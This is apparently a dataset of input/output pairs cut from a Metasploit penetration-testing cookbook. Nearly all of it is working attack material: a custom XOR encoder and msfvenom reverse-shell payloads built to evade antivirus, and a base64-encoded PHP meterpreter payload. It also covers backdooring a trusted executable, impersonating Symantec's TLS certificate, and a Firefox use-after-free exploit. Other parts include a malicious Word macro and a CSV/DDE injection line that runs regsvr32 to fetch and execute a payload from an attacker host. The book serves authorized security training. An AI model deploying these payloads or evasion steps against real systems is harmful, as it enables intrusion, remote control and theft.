[key].pack('L<')\ni=0\nblock.unpack('C*').each do |ch|\noctet = key_tab[i%4]\nt = ch.ord ^ octet.ord\nencoded += t.chr\ni+=1\nend\nreturn encoded\nend\nend\nTo use the encoder, copy it to the /usr/share/metasploit-\nframework/modules/encoders/x86 folder with the name bf_xor.rb.\n5. Now that we have our custom encoder ready, we can use it to encode our\npayload and bypass security solutions:\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp\nLHOST=192.168.216.5 -f exe-only -e x86/bf_xor -o bf_xor.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows\nfrom the payload\nNo Arch selected, selecting Arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/bf_xor\nx86/bf_xor succeeded with size 526 (iteration=0)\nx86/bf_xor chosen with final size 526\nPayload size: 526 bytes\nFinal size of exe-only file: 73802 bytes\nSaved as: bf_xor.exe\nroot@kali:~#\n[ 248 ]"
  },
  {
    "input": "There's more...",
    "output": "Using MSFvenom Chapter 6\nThere's more...\nWhen testing payloads, we should never use online scanners, such as VirusTotal. They will\nshare the samples with antivirus vendors and security companies, so they can improve their\nservices and products. This is why, when testing your payloads, you should do a proper\nreconnaissance of your target, identify the security solutions used, then install the product\non a virtual machine, disable client telemetry submissions, and safely test your payloads. In\nthis recipe, I have installed and tested the payloads against Symantec Endpoint Protection\n12:\n[ 249 ]"
  },
  {
    "input": "How to do it...",
    "output": "Using MSFvenom Chapter 6\nThis time, we were able to successfully bypass the antivirus solution:\\\nOutput formats\nNow that we have learnt the basic usage of msfvenom, let's explore some of the available\noutput formats. At the beginning of this chapter, we listed all the available output formats\nusing the --help-formats option; now we will focus on some of the different types and\noptions.\nHow to do it...\nWe will start by having a look at the dll output format and how to use it. DLL stands for\ndynamic-link library, which is Microsoft's implementation of the shared library concept,\nmeaning that they are libraries of functions that can be imported into applications.\n1. First, we will generate our payload using dll as the output format and set up our\nlistener:\nroot@kali:~# msfconsole -q\nmsf > msfvenom -p windows/meterpreter/reverse_https\nLHOST=192.168.216.5 -f dll -o inject.dll\n[*] exec: msfvenom -p windows/meterpreter/reverse_https\n[ 250 ]\nUsing MSFvenom Chapter 6\nLHOST=192.168.216.5 -f dll -o inject.dll\nNo platform was selected, choosing Msf::Module::Platform::Windows\nfrom the payload\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 426 bytes\nFinal size of dll file: 5120 bytes\nSaved as: inject.dll\nmsf > use exploit/multi/handler\nmsf exploit(multi/handler) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(multi/handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(multi/handler) > run\n[*] Started HTTPS reverse handler on https://192.168.216.5:8443\n2. Unlike an executable, we need to use another application to load our DLL\npayload. In this example, we will use rundll32.exe to load the library and run\nour shellcode. To load the DLL, use rundll32.exe, followed by the DLL we\ncreated, and the entry point name main:\nmsf exploit(multi/handler) > run\n[*] Started HTTPS reverse handler on https://192.168.216.5:8443\n[*] https://192.168.216.5:8443 handling request from\n192.168.216.10; (UUID: xarfcvfr) Staging x86 payload (180825 bytes)\n...\n[*] Meterpreter session 1 opened (192.168.216.5:8443 ->\n192.168.216.10:50589) at 2017-12-15 15:08:45 +0000\nmeterpreter >\nGreat, and, as we expected, we have a new session using our DLL payload.\n[ 251 ]\nUsing MSFvenom Chapter 6\nMSFvenom can help us create payloads with stealth capabilities, take advantage\nof advanced shells, such as meterpreter, and use encoders when performing web\napplication penetration tests.\n3. To create a PHP Meterpreter payload using Base64 encoding, we can use the\nfollowing command:\nroot@kali:~# msfvenom -p php/meterpreter/reverse_tcp\nLHOST=192.168.216.5 -f raw -e php/base64\nNo platform was selected, choosing Msf::Module::Platform::PHP from\nthe payload\nNo Arch selected, selecting Arch: php from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of php/base64\nphp/base64 succeeded with size 1509 (iteration=0)\nphp/base64 chosen with final size 1509\nPayload size: 1509 bytes\neval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlw\nID0gJzE5Mi4xNjguMjE2LjUnOyAkcG9ydCA9IDQ0NDQ7IGlmICgoJGYgPSAnc3RyZWF\ntX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidG\nNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkc\nyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0g\nJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICg\nkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJG\nYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb\n25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5\ncGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnV\nuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc1\n90eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrO\nyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsg\nfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2so.Ik5sZW4iLCAkbGVuKT\nsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkb\nGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVh\nZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC4\n9IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE\n9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJ\nHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0\nKCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGF\nzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZW\nxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw));\nroot@kali:~#\n4. To test the payload, first start a listener in a new Terminal window:\nroot@kali:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp\n[ 252 ]\nUsing MSFvenom Chapter 6\nPAYLOAD => php/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run\n[*] Started reverse TCP handler on 192.168.216.5:4444\n5. Next, use php -a to start a PHP interactive shell, and paste the payload we have\ncreated:\n6. Back in the listener, we should have a new session:\nroot@kali:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp\nPAYLOAD => php/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] Sending stage (37543 bytes) to 192.168.216.5\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.5:40720) at 2017-12-17 05:43:06 -0500\nmeterpreter >\n[ 253 ]"
  },
  {
    "input": "How to do it...",
    "output": "Using MSFvenom Chapter 6\nTemplates\nBackdooring known applications can be a good way to compromise a target, for example,\nwhen you are already on the internal network and get access to the internal software\nrepository. Also, by using a custom template, you may be able to bypass some security\nsolutions that are using the default template to detect Metasploit payloads.\nGetting ready\nMSFvenom, by default, uses the templates in the /usr/share/metasploit-\nframework/data/templates directory, but we can choose to use our own, using the -x\noption.\nHow to do it...\n1. Using the -x option, we can specify our own template; in this recipe we will use\nProcess Explorer from Windows Sysinternals, and, by using the -k option, we\ncan run your payload as a new thread from the template:\nroot@kali:~# msfvenom -p windows/meterpreter/reverse_tcp\nLHOST=192.168.216.5 -x procexp.exe -k -f exe -o procexp-\nbackdoored.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows\nfrom the payload\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 333 bytes\nFinal size of exe file: 4440576 bytes\nSaved as: procexp-backdoored.exe\nroot@kali:~#\n[ 254 ]\nUsing MSFvenom Chapter 6\n2. When the victim runs the payload, it will be unaware that the application has\nbeen backdoored:\nWhen creating x64 payloads with custom x64 templates, you should\nuse exe-only as the output format, instead of exe.\n[ 255 ]"
  },
  {
    "input": "How to do it...",
    "output": "Using MSFvenom Chapter 6\nMeterpreter payloads with trusted\ncertificates\nMost security solutions also do network intrusion detection, by analyzing the traffic coming\nto and from the target machines. In this case, it is most likely that, even if we can use\nencoders to bypass the antivirus, our payload will get caught when trying to connect to our\nlistener.\nGetting ready\nBecause we are using a valid TLS certificate for this recipe, I have used a DigitalOcean\ndroplet running Ubuntu 16 with 1 GB of RAM. Configure a custom domain\nzinitiative.com, and use Let's Encrypt to get a certificate.\nHow to do it...\nAfter configuring the domain DNS servers to point to the DigitalOcean droplet, getting a\ncertificate with Let's Encrypt is very simple.\n1. First, we need to install letsencrypt, which can be done using the following\ncommand:\napt install letsencrypt -y\n2. Next, to generate the certificate run the letsencrypt command, and follow the\ninstructions:\nletsencrypt certonly --manual -d zinitiative.com\n3. If all goes as expected, you should have your certificates under\nthe /etc/letsencrypt/live/zinitiative.com directory:\nroot@Metasploit:~# ls /etc/letsencrypt/live/zinitiative.com\ncert.pem chain.pem fullchain.pem privkey.pem\n[ 256 ]\nUsing MSFvenom Chapter 6\n4. But before we can move on, we will have to create a unified file\ncontaining privkey.pem and cert.pem; for that we will use the cat command,\nas follows:\nroot@Metasploit:~# cd /etc/letsencrypt/live/zinitiative.com/\nroot@Metasploit:/etc/letsencrypt/live/zinitiative.com# cat\nprivkey.pem cert.pem >> /root/unified.pem\nroot@Metasploit:/etc/letsencrypt/live/zinitiative.com#\n5. To install Metasploit, use the Linux and macOS quick installation script:\ncurl\nhttps://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/\nconfig/templates/metasploit-framework-wrappers/msfupdate.erb >\nmsfinstall && \\\nchmod 755 msfinstall && \\\n./msfinstall\n6. Now that we have all that we need, we can set up our listener to use our trusted\ncertificate using the HandlerSSLCert option, with the path to the certificate in\nunified PEM format. To enable verification of the certificate in Meterpreter, we\nwill set StagerVerifySSLCert to true and also set EnableStageEncoding to\nencode the second stage payload, thus helping us to bypass several security\nsolutions:\nroot@Metasploit:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(multi/handler) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(multi/handler) > set LHOST zinitiative.com\nLHOST => zinitiative.com\nmsf exploit(multi/handler) > set LPORT 443\nLPORT => 443\nmsf exploit(multi/handler) > set HandlerSSLCert /root/unified.pem\nHandlerSSLCert => /root/unified.pem\nmsf exploit(multi/handler) > set StagerVerifySSLCert true\nStagerVerifySSLCert => true\nmsf exploit(multi/handler) > set EnableStageEncoding true\nEnableStageEncoding => true\nmsf exploit(multi/handler) > exploit\n[*] Started HTTPS reverse handler on https://45.55.45.143:443\n[ 257 ]\nUsing MSFvenom Chapter 6\n7. Next, we will create our payload with the same options we have used in previous\nrecipes but this time using a domain name, zinitiative.com as the LHOST\ninstead of an IP address:\nroot@Metasploit:~# msfvenom -p windows/meterpreter/reverse_https\nLHOST=zinitiative.com LPORT=443 -f exe -o trusted.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows\nfrom the payload\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 484 bytes\nFinal size of exe file: 73802 bytes\nSaved as: trusted.exe\nroot@Metasploit:~#To serve the payload to our target we can use a\nPyhton3 build-in HTTP server.\nroot@Metasploit:~# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 ...\n8. After downloading and running our payload on the target machine, we can see\nthat we have a new session:\nmsf exploit(multi/handler) > exploit\n[*] Started HTTPS reverse handler on https://45.55.45.143:443\n[*] https://zinitiative.com:443 handling request from 62.169.66.5;\n(UUID: kkouk57g) Meterpreter will verify SSL Certificate with SHA1\nhash a408ac31831f41f50aa823cba7a0259ec32a2c9a\n[*] https://zinitiative.com:443 handling request from 62.169.66.5;\n(UUID: kkouk57g) Encoded stage with x86/shikata_ga_nai\n[*] https://zinitiative.com:443 handling request from 62.169.66.5;\n(UUID: kkouk57g) Staging x86 payload (180854 bytes) ...\n[*] Meterpreter session 1 opened (45.55.45.143:443 ->\n62.169.66.5:24021) at 2017-12-18 10:30:20 +0000\nmeterpreter >\nLooking at the output, we see that Meterpreter verified the SSL certificate and encoded the\nstage with the x86/shikata_ga_nai encoder.\n[ 258 ]"
  },
  {
    "input": "There's more...",
    "output": "Using MSFvenom Chapter 6\nThere's more...\nAnother simpler way to bypass network security solutions is to use the HTTP SSL\nCertificate Impersonation auxiliary module to impersonate an SSL certificate, and then use\nit to encrypt the communication between the payload and the listener.\nFirst, we need to impersonate a certificate, which means that we will copy a remote SSL\ncertificate and create a local (self-signed) version, using the information from the remote\nversion. In this recipe, we will impersonate Symantec's certificate:\nroot@kali:~# msfconsole -q\nmsf > use auxiliary/gather/impersonate_ssl\nmsf auxiliary(gather/impersonate_ssl) > set RHOST www.symantec.com\nRHOST => www.symantec.com\nmsf auxiliary(gather/impersonate_ssl) > run\n[*] www.symantec.com:443 - Connecting to www.symantec.com:443\n[*] www.symantec.com:443 - Copying certificate from www.symantec.com:443\n/jurisdictionC=US/jurisdictionST=Delaware/businessCategory=Private\nOrganization/serialNumber=2158113/C=US/postalCode=94043/ST=California/L=Mou\nntain View/street=350 Ellis Street/O=Symantec Corporation/OU=Corp Mktg &\nComms - Online Exp/CN=www.symantec.com\n[*] www.symantec.com:443 - Beginning export of certificate files\n[*] www.symantec.com:443 - Creating looted key/crt/pem files for\nwww.symantec.com:443\n[+] www.symantec.com:443 - key:\n/root/.msf4/loot/20171214142538_default_23.214.223.177_www.symantec.com_506\n856.key\n[+] www.symantec.com:443 - crt:\n/root/.msf4/loot/20171214142538_default_23.214.223.177_www.symantec.com_101\n219.crt\n[+] www.symantec.com:443 - pem:\n/root/.msf4/loot/20171214142538_default_23.214.223.177_www.symantec.com_722\n611.pem\n[*] Auxiliary module execution completed\nmsf auxiliary(gather/impersonate_ssl) >\nNow that we have the certificate, we can use MSFvenom to create our payload; in this\nrecipe we will also use the certificate in the payload by using the HandlerSSLCert and\nthe StagerVerifySSLCert options:\nroot@kali:~# msfvenom -p windows/meterpreter_reverse_https\nLHOST=192.168.216.5 LPORT=443\nHandlerSSLCert=/root/.msf4/loot/20171214142538_default_23.214.223.177_www.s\nymantec.com_722611.pem StagerVerifySSLCert=true -f exe -o payload.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows from the\n[ 259 ]\nUsing MSFvenom Chapter 6\npayload\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 180825 bytes\nFinal size of exe file: 256000 bytes\nSaved as: payload.exe\nroot@kali:~#\nAs we did in the previous recipe, we will set up our listener to use the impersonated\ncertificate, and, when the victim runs the payload, we will get a new Meterpreter session:\nroot@kali:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(multi/handler) > set PAYLOAD windows/meterpreter_reverse_https\nPAYLOAD => windows/meterpreter_reverse_https\nmsf exploit(multi/handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(multi/handler) > set LPORT 443\nLPORT => 443\nmsf exploit(multi/handler) > set HandlerSSLCert\n/root/.msf4/loot/20171214142538_default_23.214.223.177_www.symantec.com_722\n611.pem\nHandlerSSLCert =>\n/root/.msf4/loot/20171214142538_default_23.214.223.177_www.symantec.com_722\n611.pem\nmsf exploit(multi/handler) > set StagerVerifySSLCert true\nStagerVerifySSLCert => true\nmsf exploit(multi/handler) > exploit\n[*] Meterpreter will verify SSL Certificate with SHA1 hash\n554761fad28996e364b3ebf8f8d592c4a8b687fc\n[*] Started HTTPS reverse handler on https://192.168.216.5:443\n[*] https://192.168.216.5:443 handling request from 192.168.216.10; (UUID:\nogrw285x) Redirecting stageless connection from /CdCmZhL-\nJt9xUHBRK2fV9w5dEyxhGKdPF3tBnrHYW0bYOqdwp34rKeD with UA 'Mozilla/5.0\n(Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'\n[*] https://192.168.216.5:443 handling request from 192.168.216.10; (UUID:\nogrw285x) Attaching orphaned/stageless session...\n[*] Meterpreter session 1 opened (192.168.216.5:443 ->\n192.168.216.10:51665) at 2017-12-18 11:21:11 +0000\nmeterpreter >\n[ 260 ]"
  },
  {
    "input": "Introduction",
    "output": "7\nClient-Side Exploitation and\nAntivirus Bypass\nIn this chapter, we will cover the following recipes:\nExploiting a Windows 10 machine\nBypassing antivirus and IDS/IPS\nMetasploit macro exploits\nHuman Interface Device attacks\nHTA attack\nBackdooring executables using a MITM attack\nCreating a Linux trojan\nCreating an Android backdoor\nIntroduction\nIn the previous chapters, we focused on server-side exploitation. Nowadays, the most\nsuccessful attacks target endpoints; the reason is that with most of the security budget and\nconcern going to internet-facing servers and services, it is getting harder to find exploitable\nservices or at least ones that haven't already been compromised or patched. However, when\nwe get access to a client machine the reality is different, the operating system may have all\nthe updates but that doesn't apply to all the software running on the machine."
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nExploiting a Windows 10 machine\nIn this recipe, we will exploit a use-after-free vulnerability present in\nnsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla\nFirefox on Microsoft Windows.\nGetting ready\nSo, before we begin we need to download Mozilla Firefox 41.0 from https:/​/​ftp.​mozilla.\norg/​pub/​firefox/​releases/​41.​0/​win32/​en-​US/​Firefox%20Setup%2041.​0.​exe and install it\non our Windows 10 target machine.\nHow to do it...\nAs always, good reconnaissance makes all the difference, so we first need to gather\ninformation about the browser the victim is using.\n1. To help us with this task, we can use the HTTP Client Information Gather\nauxiliary module by specifying the IP address and port of the host to listen on\nand the URI to use, then use one of your favorite pretexts to make the victim\nopen the link:\nmsf > use auxiliary/gather/browser_info\nmsf auxiliary(gather/browser_info) > set SRVHOST 192.168.216.5\nSRVHOST => 192.168.216.5\nmsf auxiliary(gather/browser_info) > set SRVPORT 80\nSRVPORT => 80\nmsf auxiliary(gather/browser_info) > set URIPATH /\nURIPATH => /\nmsf auxiliary(gather/browser_info) > run\n[*] Auxiliary module running as background job 1.\nmsf auxiliary(gather/browser_info) >\n[*] Using URL: http://192.168.216.5:80/\n[*] Server started.\n[*] Gathering target information for 192.168.216.150\n[*] Sending HTML response to 192.168.216.150\n[+] 192.168.216.150 - We have found the following interesting\ninformation:\n[*] 192.168.216.150 - source = Browser allows JavaScript\n[*] 192.168.216.150 - ua_name = Firefox\n[*] 192.168.216.150 - ua_ver = 41.0\n[*] 192.168.216.150 - arch = x86\n[ 262 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n[*] 192.168.216.150 - os_name = Windows\n[*] 192.168.216.150 - language = en-US,en;q=0.5\n2. Looking at the output, we can see that the victim is running Firefox version 41.0.\nWith this information, we can see that there is an exploit we can use on Firefox\nnsSMILTimeContainer::NotifyTimeChange() with the RCE exploit module.\n3. To exploit the target using this module, we first need to set the IP address and\nport of the host we will be serving the exploit on and the URI to use, then set the\npayload we want to execute on the target, and since we are using a reverse shell,\nwe also need to specify the listening host IP address:\nmsf auxiliary(gather/browser_info) > use\nexploit/windows/browser/firefox_smil_uaf\nmsf exploit(windows/browser/firefox_smil_uaf) > set SRVHOST\n192.168.216.5\nSRVHOST => 192.168.216.5\nmsf exploit(windows/browser/firefox_smil_uaf) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(windows/browser/firefox_smil_uaf) > set URIPATH /\nURIPATH => /\nmsf exploit(windows/browser/firefox_smil_uaf) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(windows/browser/firefox_smil_uaf) > set LHOST\n192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(windows/browser/firefox_smil_uaf) > exploit\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(windows/browser/firefox_smil_uaf) > [*] Using URL:\nhttp://192.168.216.5:80/\n[*] Server started.\nNow that we have everything set up, we will need the victim to browse to our\nsite—this can be achieved using several means, email, social media, and so on\n4. When the victim accesses the URL, we should successfully exploit the use-after-\nfree vulnerability and get a new session running in the context of the user that\naccesses the URL.\nNote that, to prevent us from losing the session if the user closes the\nbrowser, this module uses the post/windows/manage/priv_migrate\npost-exploitation module to migrate to the explorer.exe process.\n[ 263 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nBypassing antivirus and IDS/IPS\nAs time went by, and Metasploit became the tool to use for exploitation, security vendors\nstarted to detect and stop exploits from running. As we have seen in the previous chapter,\nsome did this by detecting the encoders used, others simply by detecting the default\ncertificate used to encrypt the communication between the payloads and the listener. One\napproach to bypassing these solutions is to combine the use of custom encoders and trusted\ncertificates.\nHow to do it...\nIn this recipe, we will combine several bypass techniques in order to successfully\nbypass antivirus and IDS/IPS solutions.\n1. First, we will create the payload using the bf_xor custom encoder used in the\nprevious chapter; this way we can ensure that the solution looking for the default\nencoders won't flag our payload as malware:\nroot@Metasploit:~# msfvenom -p windows/meterpreter/reverse_winhttps\nLHOST=zinitiative.com LPORT=443 HandlerSSLCert=./unified.pem\nStagerVerifySSLCert=true -f exe -e x86/bf_xor -o bypass.exe\nNo platform was selected, choosing Msf::Module::Platform::Windows\nfrom the payload\nNo Arch selected, selecting Arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/bf_xor\nx86/bf_xor succeeded with size 1259 (iteration=0)\nx86/bf_xor chosen with final size 1259\nPayload size: 1259 bytes\nFinal size of exe file: 73802 bytes\nSaved as: bypass.exe\n2. Next, we will use the trusted certificate we created in the previous chapter\nusing Let's Encrypt for the Meterpreter HTTPS transport:\nroot@Metasploit:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(multi/handler) > set PAYLOAD\nwindows/meterpreter/reverse_winhttps\nPAYLOAD => windows/meterpreter/reverse_winhttps\nmsf exploit(multi/handler) > set LHOST zinitiative.com\nLHOST => zinitiative.com\nmsf exploit(multi/handler) > set LPORT 443\n[ 264 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\nLPORT => 443\nmsf exploit(multi/handler) > set HANDLERSSLCERT /root/unified.pem\nHANDLERSSLCERT => /root/unified.pem\nmsf exploit(multi/handler) > set StagerVerifySSLCert true\nStagerVerifySSLCert => true\nmsf exploit(multi/handler) > set EnableStageEncoding true\nEnableStageEncoding => true\nmsf exploit(multi/handler) > exploit\n[*] Meterpreter will verify SSL Certificate with SHA1 hash\na408ac31831f41f50aa823cba7a0259ec32a2c9a\n[*] Started HTTPS reverse handler on https://45.55.45.143:443\n3. Now, we just need to run the payload on the target machine:\n[*] https://zinitiative.com:443 handling request from\n89.114.197.227; (UUID: wsfkfmsz) Meterpreter will verify SSL\nCertificate with SHA1 hash a408ac31831f41f50aa823cba7a0259ec32a2c9a\n[*] https://zinitiative.com:443 handling request from\n89.114.197.227; (UUID: wsfkfmsz) Encoded stage with\nx86/shikata_ga_nai\n[*] https://zinitiative.com:443 handling request from\n89.114.197.227; (UUID: wsfkfmsz) Staging x86 payload (180854 bytes)\n...\n[*] Meterpreter session 1 opened (45.55.45.143:443 ->\n89.114.197.227:43597) at 2017-12-23 12:03:59 +0000\nmeterpreter > getuid\nServer username: WINDOWS10\\User\nmeterpreter >\nGreat, as we can see the payload wasn't detected and we have a new session on the target\nmachine. When testing an exploit and it gets caught by a security solution, apply the same\nprinciples, create a custom payload and use it with the set PAYLOAD generic/custom\noption.\nWith time, the custom encoder showed in this book that we also get\nflagged by security solutions, but that shouldn't be a problem; just make\nsome simple changes to the encoder or create your own, and you should\nbe able to evade the signature created.\n[ 265 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nMetasploit macro exploits\nMacro attacks are probably one of the most frequently used methods when it comes to\ncompromising client machines, and since macros are used for business-related tasks, they\nwill be around for a long time.\nHow to do it...\n1. In this recipe, we will use the Microsoft Office Word Malicious Macro Execution\nexploit module to inject a malicious macro into a Microsoft Office Word\ndocument:\nmsf > use exploit/multi/fileformat/office_word_macro\nmsf exploit(multi/fileformat/office_word_macro) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(multi/fileformat/office_word_macro) > set LHOST\n192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(multi/fileformat/office_word_macro) > set LPORT 443\nLPORT => 443\nmsf exploit(multi/fileformat/office_word_macro) > exploit\n[*] Using template: /usr/share/metasploit-\nframework/data/exploits/office_word_macro/template.docx\n[*] Injecting payload in document comments\n[*] Injecting macro and other required files in document\n[*] Finalizing docm: msf.docm\n[+] msf.docm stored at /root/.msf4/local/msf.docm\nmsf exploit(multi/fileformat/office_word_macro) >\n2. Next, we will use the handler command to start a payload handler as a job,\nusing -p to specify the payload, -H for the listening IP address, and -P for the\nlistening port:\nmsf exploit(multi/fileformat/office_word_macro) > handler -p\nwindows/meterpreter/reverse_https -H 192.168.216.5 -P 443\n[*] Payload handler running as background job 0.\n[*] Started HTTPS reverse handler on https://192.168.216.5:443\nmsf exploit(multi/fileformat/office_word_macro) >\n[ 266 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\nThen copy the Word document to the target machine, open it, and remember to\nenable macros:\nBack in the Kali machine, we should see a new session:\nmsf exploit(multi/fileformat/office_word_macro) > [*]\nhttps://192.168.216.5:443 handling request from 192.168.216.151;\n(UUID: 9nexcb2v) Staging x86 payload (180825 bytes) ...\n[*] Meterpreter session 1 opened (192.168.216.5:443 ->\n192.168.216.151:49807) at 2017-12-23 09:17:13 -0500\nmsf exploit(multi/fileformat/office_word_macro) > sessions 1\n[*] Starting interaction with 1...\nmeterpreter > getuid\nServer username: WINDOWS10\\User\nmeterpreter >\n3. To exploit a CSV injection, we will use the Script Web Delivery exploit module.\nFirst, we set the target to regsvr32 using the set TARGET 3 command, then we\nset the listening host and URI for the server and specify the payload to use\nfollowed by the listening host and port for the payload:\nmsf > use exploit/multi/script/web_delivery\nmsf exploit(multi/script/web_delivery) > set TARGET 3\nTARGET => 3\nmsf exploit(multi/script/web_delivery) > set URIPATH /\nURIPATH => /\nmsf exploit(multi/script/web_delivery) > set SRVHOST 192.168.216.5\nSRVHOST => 192.168.216.5\nmsf exploit(multi/script/web_delivery) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(multi/script/web_delivery) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(multi/script/web_delivery) > set LPORT 443\nLPORT => 443\nmsf exploit(multi/script/web_delivery) > exploit\n[*] Exploit running as background job 0.\n[*] Started HTTPS reverse handler on https://192.168.216.5:443\n[*] Using URL: http://192.168.216.5:8080/\n[ 267 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n[*] Server started.\n[*] Run the following command on the target machine:\nregsvr32 /s /n /u /i:http://192.168.216.5:8080/.sct scrobj.dll\nDynamic Data Exchange (DDE) uses the following format:\n=DDE(server; file; item; mode)\n4. So, to create a simple proof of concept, we can create a CSV file with the\nfollowing content:\n=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\calc.exe'!''\nThis will open calc.exe. Since opening a calculator is not useful for our purpose,\nin our malicious CSV file we will use regsvr32 to download and run our\npayload and give us back a reverse shell:\n=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u\n/i:http://192.168.216.5:8080/.sct scrobj.dll'!''\n5. Now that we have our malicious CSV file, we just need to send it to the target\nmachine and open it with Excel. When opening the file, we will get two warning\nmessages:\n[ 268 ]"
  },
  {
    "input": "Human Interface Device attacks",
